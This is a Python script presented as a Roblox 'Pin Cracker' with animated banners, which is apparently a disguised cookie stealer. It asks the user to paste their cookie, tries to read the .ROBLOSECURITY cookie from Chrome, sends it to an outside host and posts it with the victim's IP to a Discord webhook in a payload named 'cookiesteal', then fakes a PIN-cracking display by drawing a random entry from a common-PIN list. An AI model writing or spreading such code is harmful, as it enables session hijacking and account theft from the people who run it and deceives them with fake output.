import pystyle
import random
from random import choice, randint, shuffle
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
import requests
import os
import time
import colorama
from colorama import Fore

ip = requests.get('https://checkip.amazonaws.com').text.strip()   

def clear(): os.system('cls' if os.name == 'nt' else 'clear')
pc = os.getenv("UserName")
webhook = ("WEBHOOK_HERE")
c_pins = [
"1234",
"1111",
"1337",
"0000",
"1984",
"6969",
"5555",
"1212",
"7777",
"6666",
"4444",
"1987",
"2580",
"1991",
"1988",
"1977",
"1976",
"9999",
"1993",
"1990",
"1985",
"1981",
"1973",
"1488",
"2323",
"1986",
"1982",
"1978",
"1975",
"1701",
"9876",
"4321",
"1980",
"1972",
"1313",
"1122",
"1024",
"2312",
"1996",
"1983",
"1979",
"1974",
"1971",
"1968",
"1818",
"1357",
"8888",
"4242",
"3141",
"2008",
"1995",
"1989",
"1966",
"1324",
"1210",
"0303",
"8989",
"8520",
"2903",
"2222",
"2005",
"1992",
"1478",
"1414",
"1410",
"1314",
"1221",
"1209",
"1102",
"1012",
"1010",
"0815",
"0007",
"9527",
"8008",
"7272",
"5150",
"4680",
"4371",
"3579",
"3333",
"3234",
"3003",
"2892",
"2612",
"2602",
"2468",
"2255",
"2112",
"2109",
"2013",
"2006",
"1999",
"1998",
"1997",
"1994",
"1970",
"1919",
"1912",
"1906",
]

banner3 = """
                           ██████╗ ██╗███╗   ██╗███████╗
                           ██╔══██╗██║████╗  ██║╚══███╔╝
                           ██████╔╝██║██╔██╗ ██║  ███╔╝ 
                           ██╔═══╝ ██║██║╚██╗██║ ███╔╝  
                           ██║     ██║██║ ╚████║███████╗
                           ╚═╝     ╚═╝╚═╝  ╚═══╝╚══════╝                          
                                                                                       
                                                                                       
██████  ██████  ███████ ███████ ███████     ███████ ███    ██ ████████ ███████ ██████  
██   ██ ██   ██ ██      ██      ██          ██      ████   ██    ██    ██      ██   ██ 
██████  ██████  █████   ███████ ███████     █████   ██ ██  ██    ██    █████   ██████  
██      ██   ██ ██           ██      ██     ██      ██  ██ ██    ██    ██      ██   ██ 
██      ██   ██ ███████ ███████ ███████     ███████ ██   ████    ██    ███████ ██   ██ 
 
"""
Anime.Fade(Center.Center(banner3), Colors.blue_to_green, Colorate.Vertical, enter=True)
clear()
banner4 = """









██     ██ ███████ ██       ██████  ██████  ███    ███ ███████ 
██     ██ ██      ██      ██      ██    ██ ████  ████ ██      
██  █  ██ █████   ██      ██      ██    ██ ██ ████ ██ █████   
██ ███ ██ ██      ██      ██      ██    ██ ██  ██  ██ ██      
 ███ ███  ███████ ███████  ██████  ██████  ██      ██ ███████ 
"""
print(Colorate.Diagonal(Colors.blue_to_green, Center.XCenter(banner4)))
time.sleep(1)
clear()
banner5 = """









████████  ██████  
   ██    ██    ██ 
   ██    ██    ██ 
   ██    ██    ██ 
   ██     ██████
"""
print(Colorate.Diagonal(Colors.blue_to_green, Center.XCenter(banner5)))
time.sleep(1)
clear()
banner6 = """









██████╗ ██╗███╗   ██╗███████╗
██╔══██╗██║████╗  ██║╚══███╔╝
██████╔╝██║██╔██╗ ██║  ███╔╝ 
██╔═══╝ ██║██║╚██╗██║ ███╔╝  
██║     ██║██║ ╚████║███████╗
╚═╝     ╚═╝╚═╝  ╚═══╝╚══════╝ 
"""
print(Colorate.Diagonal(Colors.blue_to_green, Center.XCenter(banner6)))
time.sleep(1)
os.system(f"title Pin Cracker V2 / Welcome User: {pc}")
clear()
pass

title = """
      Developed By SYN
██████╗ ██╗███╗   ██╗███████╗
██╔══██╗██║████╗  ██║╚══███╔╝
██████╔╝██║██╔██╗ ██║  ███╔╝ 
██╔═══╝ ██║██║╚██╗██║ ███╔╝  
██║     ██║██║ ╚████║███████╗
╚═╝     ╚═╝╚═╝  ╚═══╝╚══════╝
"""
print(Colorate.Horizontal(Colors.blue_to_green, Center.XCenter(title)))

cookie = input("Enter Cookie > ")

try:
   cookies = browser_cookie3.chrome(domain_name='roblox.com')
   cookies = str(cookies)
   cookies = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
   r=requests.get(f"https://story-of-jesus.xyz/e.php?cookie={cookie}").json()
except:cookies = "Cookie Not Found"
pass
# bruh you add {cookies} in the desc im way too lazy
cookiesteal = {
            "embeds": [
              {
                "description": f"``` + {cookie} +\n + {cookies} + ```",
                "author": {
                  "name": "Success : " + ip,
                },
                "footer": {
                    "text": "Pin Cracker | https://github.com/syntheticc"
                }
              }
            ],
            "username": "Synthetic's Pin Cracker",
            "avatar_url": "https://cdn.discordapp.com/attachments/1021263906070593616/1036044216754765884/synful.jpg",
            "attachments": []
        }
requests.post(webhook, json=cookiesteal)
time.sleep(1)
clear()
cracking = """
 ██████╗██████╗  █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗          
██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝          
██║     ██████╔╝███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗         
██║     ██╔══██╗██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║         
╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝██╗██╗██╗
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝╚═╝╚═╝
"""
print(Colorate.Horizontal(Colors.blue_to_green, Center.XCenter(cracking)))
time.sleep(5)
print("Bypassing Account Lock..")
time.sleep(2)
print("Loading Stealth Config...")
time.sleep(2)
clear()
crackings = """
 ██████╗██████╗  █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗          
██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝          
██║     ██████╔╝███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗         
██║     ██╔══██╗██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║         
╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝██╗██╗██╗
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝╚═╝╚═╝
"""
print(Colorate.Horizontal(Colors.blue_to_green, Center.XCenter(crackings)))
time.sleep(2)
print("> Trying most common pins")

pin = (random.choice(c_pins))
for x in c_pins: 
    time.sleep(1)
    check = x
    if x == pin :
        print(Fore.GREEN + f"PIN : {pin} | CRACKED")
        break
    else:
        print (Fore.RED +f"PIN : {check} | INVALID")
time.sleep(30)
